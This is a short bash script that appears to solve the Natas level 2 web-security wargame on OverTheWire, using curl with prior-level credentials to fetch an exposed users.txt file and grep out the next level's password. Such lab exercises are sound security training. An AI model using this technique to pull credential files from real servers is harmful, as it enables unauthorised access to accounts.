#!/bin/bash

curl --user $(./natas1.sh) http://natas2.natas.labs.overthewire.org/files/users.txt 2>/dev/null | grep natas3
